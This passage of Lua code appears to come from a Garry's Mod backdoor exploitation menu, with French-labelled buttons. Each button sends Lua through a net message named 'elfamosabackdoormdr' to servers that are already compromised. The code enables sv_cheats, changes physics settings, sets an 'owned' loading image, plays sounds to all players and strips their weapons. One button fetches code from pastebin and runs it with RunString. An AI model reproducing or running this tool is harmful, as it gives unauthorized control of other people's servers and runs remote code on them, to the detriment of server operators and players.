        PetiteFaux20:SetText("Réparé La Physique")
        PetiteFaux20.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux20.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux20.DoClick = function ()
		Notifications("C'est meilleur maintenant !!!")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"8\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux21 = DESTROYSERVER:Add( "DButton")
        PetiteFaux21:SetSize(375,25)
        PetiteFaux21:SetPos(27,820)
		PetiteFaux21:SetFont("jspquoimettre")
        PetiteFaux21:SetTextColor(noir)
        PetiteFaux21:SetText("Transformer Les Joueurs En Escargots")
        PetiteFaux21.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux21.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux21.DoClick = function ()
		Notifications("C'est LEEEEEEEEEEEEEEEENT")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"100\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux22 = DESTROYSERVER:Add( "DButton")
        PetiteFaux22:SetSize(375,25)
        PetiteFaux22:SetPos(27,860)
		PetiteFaux22:SetFont("jspquoimettre")
        PetiteFaux22:SetTextColor(noir)
        PetiteFaux22:SetText("Transformer Le Sol En Patinoire")
        PetiteFaux22.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux22.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux22.DoClick = function ()
		Notifications("Sa glisse bordel")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"1\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux23 = DESTROYSERVER:Add( "DButton")
        PetiteFaux23:SetSize(375,25)
        PetiteFaux23:SetPos(27,900)
		PetiteFaux23:SetFont("jspquoimettre")
        PetiteFaux23:SetTextColor(noir)
        PetiteFaux23:SetText("Autorisé Les Cheats Sur Le Serveur")
        PetiteFaux23.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux23.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux23.DoClick = function ()
		Notifications("C'était pas trop utile mais tu vien de le faire...")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_cheats\", \"1\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux24 = DESTROYSERVER:Add( "DButton")
        PetiteFaux24:SetSize(375,25)
        PetiteFaux24:SetPos(27,940)
		PetiteFaux24:SetFont("jspquoimettre")
        PetiteFaux24:SetTextColor(noir)
        PetiteFaux24:SetText("Changer Le LoadingScreen")
        PetiteFaux24.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux24.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux24.DoClick = function ()
		Notifications("C'est plus propre maintenant :D")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_loadingurl\", \"https://image.noelshack.com/fichiers/2018/13/3/1522248793-owned.png\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end

	local PetiteFaux25 = DESTROYSERVER:Add( "DButton")
        PetiteFaux25:SetSize(375,25)
        PetiteFaux25:SetPos(27,980)
		PetiteFaux25:SetFont("jspquoimettre")
        PetiteFaux25:SetTextColor(noir)
        PetiteFaux25:SetText("Mettre Les Dancing Skeleton")
        PetiteFaux25.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux25.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux25.DoClick = function ()
		Notifications("Dancing Skeleton lala")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/c1imujMM\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
--[[-----------
BOUTONS COMMANDES
--------------]]
--[[-----------
MENU MUSIQUE
--------------]]
local SONGEVER = vgui.Create( "DPanel", SOFUNNY )
    SONGEVER.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "Musiques", SONGEVER, "icon16/music.png" )

--[[-----------
MENU MUSIQUE
--------------]]


--[[-----------
BOUTONS MUSIQUE
--------------]]
local SONGEVER = vgui.Create( "DScrollPanel", SONGEVER )
SONGEVER:Dock( FILL )
SONGEVER:InnerWidth(100)
local sbar = SONGEVER:GetVBar()
function SONGEVER:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w -1000, h , HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnUp:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnDown:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnGrip:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end

   local Sonmortel = SONGEVER:Add( "DButton")
        Sonmortel:SetSize(375,25)
        Sonmortel:SetPos(27,60)
		Sonmortel:SetFont("jspquoimettre")
        Sonmortel:SetTextColor(noir)
        Sonmortel:SetText("Tule - Fearless")
        Sonmortel.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel.DoClick = function ()
		Notifications("Musique Tule - Fearless Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Tule.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

   local Sonmortel2 = SONGEVER:Add( "DButton")
        Sonmortel2:SetSize(375,25)
        Sonmortel2:SetPos(27,100)
		Sonmortel2:SetFont("jspquoimettre")
        Sonmortel2:SetTextColor(noir)
        Sonmortel2:SetText("Shy Kid - I DON'T WANT TO DIE")
        Sonmortel2.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel2.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel2.DoClick = function ()
		Notifications("Musique Shy Kid I Don't Want To Die Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/shykid.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
   local Sonmortel3 = SONGEVER:Add( "DButton")
        Sonmortel3:SetSize(375,25)
        Sonmortel3:SetPos(27,140)
		Sonmortel3:SetFont("jspquoimettre")
        Sonmortel3:SetTextColor(noir)
        Sonmortel3:SetText("SAO - Ordinalscale")
        Sonmortel3.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel3.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel3.DoClick = function ()
		Notifications("Musique Sword Art Online - Ordinal Scale")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Ordinalscale.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

   local Sonmortel4 = SONGEVER:Add( "DButton")
        Sonmortel4:SetSize(375,25)
        Sonmortel4:SetPos(27,180)
		Sonmortel4:SetFont("jspquoimettre")
        Sonmortel4:SetTextColor(noir)
        Sonmortel4:SetText("AC - Musique Epique")
        Sonmortel4.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel4.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel4.DoClick = function ()
		Notifications("Musique Epique De Assassination Classroom Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/EpicAssassin.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
   local Sonmortel5 = SONGEVER:Add( "DButton")
        Sonmortel5:SetSize(375,25)
        Sonmortel5:SetPos(27,220)
		Sonmortel5:SetFont("jspquoimettre")
        Sonmortel5:SetTextColor(noir)
        Sonmortel5:SetText("SAO - SwordLand Remix")
        Sonmortel5.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel5.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel5.DoClick = function ()
		Notifications("Remix Sword Art Online - SwordLand Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Swordland.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel6 = SONGEVER:Add( "DButton")
        Sonmortel6:SetSize(375,25)
        Sonmortel6:SetPos(27,220)
		Sonmortel6:SetFont("jspquoimettre")
        Sonmortel6:SetTextColor(noir)
        Sonmortel6:SetText("Teminite - Ascent")
        Sonmortel6.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel6.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel6.DoClick = function ()
		Notifications("Teminite - Ascent Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Ascent.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel7 = SONGEVER:Add( "DButton")
        Sonmortel7:SetSize(375,25)
        Sonmortel7:SetPos(27,260)
		Sonmortel7:SetFont("jspquoimettre")
        Sonmortel7:SetTextColor(noir)
        Sonmortel7:SetText("Along The Road")
        Sonmortel7.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel7.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel7.DoClick = function ()
		Notifications("Along The Road Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Alongtheroad.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel8 = SONGEVER:Add( "DButton")
        Sonmortel8:SetSize(375,25)
        Sonmortel8:SetPos(27,300)
		Sonmortel8:SetFont("jspquoimettre")
        Sonmortel8:SetTextColor(noir)
        Sonmortel8:SetText("Amadeus - Legendary")
        Sonmortel8.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel8.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel8.DoClick = function ()
		Notifications("Amadeus Legendary Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Legendary.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel9 = SONGEVER:Add( "DButton")
        Sonmortel9:SetSize(375,25)
        Sonmortel9:SetPos(27,340)
		Sonmortel9:SetFont("jspquoimettre")
        Sonmortel9:SetTextColor(noir)
        Sonmortel9:SetText("Two Feet - Go F*ck Yourself")
        Sonmortel9.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel9.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel9.DoClick = function ()
		Notifications("Two Feet - Go F*ck Yourself Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/gofuckyourself.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel10 = SONGEVER:Add( "DButton")
        Sonmortel10:SetSize(375,25)
        Sonmortel10:SetPos(27,380)
		Sonmortel10:SetFont("jspquoimettre")
        Sonmortel10:SetTextColor(noir)
        Sonmortel10:SetText("Moe Shop - Lyda Gets Funky")
        Sonmortel10.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel10.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel10.DoClick = function ()
		Notifications("Onii Chan :p")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/chan.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel11 = SONGEVER:Add( "DButton")
        Sonmortel11:SetSize(375,25)
        Sonmortel11:SetPos(27,420)
		Sonmortel11:SetFont("jspquoimettre")
        Sonmortel11:SetTextColor(noir)
        Sonmortel11:SetText("OPM - Opening")
        Sonmortel11.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel11.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel11.DoClick = function ()
		Notifications("Opening One Punch Man Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/OPOPM.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local Sonmortel12 = SONGEVER:Add( "DButton")
        Sonmortel12:SetSize(375,25)
        Sonmortel12:SetPos(27,460)
		Sonmortel12:SetFont("jspquoimettre")
        Sonmortel12:SetTextColor(noir)
        Sonmortel12:SetText("UT - Double Bad Time")
        Sonmortel12.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel12.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel12.DoClick = function ()
		Notifications("Undertale Remix Double Bad Time Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/doublebadtime.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
		   local Sonmortel13 = SONGEVER:Add( "DButton")
        Sonmortel13:SetSize(375,25)
        Sonmortel13:SetPos(27,500)
		Sonmortel13:SetFont("jspquoimettre")
        Sonmortel13:SetTextColor(noir)
        Sonmortel13:SetText("The Raising Fighting Spirit")
        Sonmortel13.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel13.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel13.DoClick = function ()
		Notifications("The Raising Fighting Spirit (Ponti Trap Remix)")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/ponti.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
		   local Sonmortel14 = SONGEVER:Add( "DButton")
        Sonmortel14:SetSize(375,25)
        Sonmortel14:SetPos(27,540)
		Sonmortel14:SetFont("jspquoimettre")
        Sonmortel14:SetTextColor(noir)
        Sonmortel14:SetText("Futur Musique")
        Sonmortel14.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel14.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel14.DoClick = function ()
		Notifications("Futur Musique Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"liendelamusique\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
		   local Sonmortel15 = SONGEVER:Add( "DButton")
        Sonmortel15:SetSize(375,25)
        Sonmortel15:SetPos(27,580)
		Sonmortel15:SetFont("jspquoimettre")
        Sonmortel15:SetTextColor(noir)
        Sonmortel15:SetText("Futur Musique")
        Sonmortel15.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel15.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel15.DoClick = function ()
		Notifications("Futur Musique Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"liendelamusique\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
		   local Sonmortel16 = SONGEVER:Add( "DButton")
        Sonmortel16:SetSize(375,25)
        Sonmortel16:SetPos(27,620)
		Sonmortel16:SetFont("jspquoimettre")
        Sonmortel16:SetTextColor(noir)
        Sonmortel16:SetText("Futur Musique")
        Sonmortel16.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel16.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel16.DoClick = function ()
		Notifications("Futur Musique Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"liendelamusique\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
		   local Sonmortel17 = SONGEVER:Add( "DButton")
        Sonmortel17:SetSize(375,25)
        Sonmortel17:SetPos(27,660)
		Sonmortel17:SetFont("jspquoimettre")
        Sonmortel17:SetTextColor(noir)
        Sonmortel17:SetText("Futur Musique")
        Sonmortel17.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		Sonmortel17.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        Sonmortel17.DoClick = function ()
		Notifications("Futur Musique Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"liendelamusique\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
--[[-----------
MENU MUSIQUE
--------------]]

--[[-----------
MENU SOUNDBOARD
--------------]]
local SONDERAGEUX = vgui.Create( "DPanel", SOFUNNY )
    SONDERAGEUX.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "SoundBoard", SONDERAGEUX, "icon16/sound_mute.png" )

--------------------------------
local SONDERAGEUX = vgui.Create( "DScrollPanel", SONDERAGEUX )
SONDERAGEUX:Dock( FILL )
SONDERAGEUX:InnerWidth(100)
local sbar = SONDERAGEUX:GetVBar() -- Scroll Bar :D
function SONDERAGEUX:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w -1000, h , HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnUp:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnDown:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnGrip:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end

   local supreminsulte = SONDERAGEUX:Add( "DButton")
        supreminsulte:SetSize(375,25)
        supreminsulte:SetPos(27,60)
		supreminsulte:SetFont("jspquoimettre")
        supreminsulte:SetTextColor(noir)
        supreminsulte:SetText("Débitage De Supremacist")
        supreminsulte.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		supreminsulte.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        supreminsulte.DoClick = function ()
		Notifications("LE DEBITAGE C'EST LANCER :O")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/soundboard/suprem.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end

   local yametekudasai = SONDERAGEUX:Add( "DButton")
        yametekudasai:SetSize(375,25)
        yametekudasai:SetPos(27,100)
		yametekudasai:SetFont("jspquoimettre")
        yametekudasai:SetTextColor(noir)
        yametekudasai:SetText("Yamete Kudasai")
        yametekudasai.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,Sonmortel:GetWide()-8,Sonmortel:GetTall()-8)
		end
		yametekudasai.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        yametekudasai.DoClick = function ()
		Notifications("YAMETE... YAMETE KUDASAI")
        net.Start(elfamosabackdoormdr)
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/yamete.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end




--[[-----------
MENU AUTRES
--------------]]
local LERESTEDUBORDEL = vgui.Create( "DPanel", SOFUNNY )
    LERESTEDUBORDEL.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "Autres", LERESTEDUBORDEL, "icon16/world_add.png" )

--[[-----------
MENU AUTRES
--------------]]


--[[-----------
COMMANDES AUTRES
--------------]]
local LERESTEDUBORDEL = vgui.Create( "DScrollPanel", LERESTEDUBORDEL )
LERESTEDUBORDEL:Dock( FILL )
LERESTEDUBORDEL:InnerWidth(100)
local sbar = LERESTEDUBORDEL:GetVBar()
function LERESTEDUBORDEL:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w -1000, h , HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnUp:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnDown:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnGrip:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end

   local restedubordel = LERESTEDUBORDEL:Add( "DButton")
        restedubordel:SetSize(375,25)
        restedubordel:SetPos(27,60)
		restedubordel:SetFont("jspquoimettre")
        restedubordel:SetTextColor(noir)
        restedubordel:SetText("Stoppé La Musique Du Menu")
        restedubordel.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,restedubordel:GetWide()-8,restedubordel:GetTall()-8)
		end
		restedubordel.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        restedubordel.DoClick = function ()
		RunConsoleCommand "stopsound"
		Notifications("Musique Stoppé")
        end
		
   local strip = LERESTEDUBORDEL:Add( "DButton")
        strip:SetSize(375,25)
        strip:SetPos(27,100)
		strip:SetFont("jspquoimettre")
        strip:SetTextColor(noir)
        strip:SetText("Strip Les Joueurs")
        strip.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,strip:GetWide()-8,strip:GetTall()-8)
		end
		strip.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        strip.DoClick = function ()
		jefaitlenculer()
		Notifications("Tu A Strip Les Armes Des Joueurs ( Sauf Si Le Serveur A Patch La Technique :') )")
        end
		
   local quitgame = LERESTEDUBORDEL:Add( "DButton")
        quitgame:SetSize(375,25)
        quitgame:SetPos(27,140)
		quitgame:SetFont("jspquoimettre")
        quitgame:SetTextColor(noir)
        quitgame:SetText("Arreté Le Jeu")
        quitgame.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,quitgame:GetWide()-8,quitgame:GetTall()-8)
		end
		quitgame.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        quitgame.DoClick = function ()
		RunConsoleCommand "quit"
		Notifications("Jeu Stoppé")
        end

--[[-----------
COMMANDES AUTRES
--------------]]

-- ICON --
    local icon = vgui.Create( "HTML", SOFUNNY )
    icon:SetPos( SOFUNNY:GetWide() - 50, 60 )
    icon:SetSize( 400, 700 )
    icon:SetHTML( [[
        <img src="https://image.noelshack.com/fichiers/2018/12/6/1521932224-psychose-logo.gif" alt="Img" style="width:391px;height:619px;">
    ]] )

-- AUTRES --
end)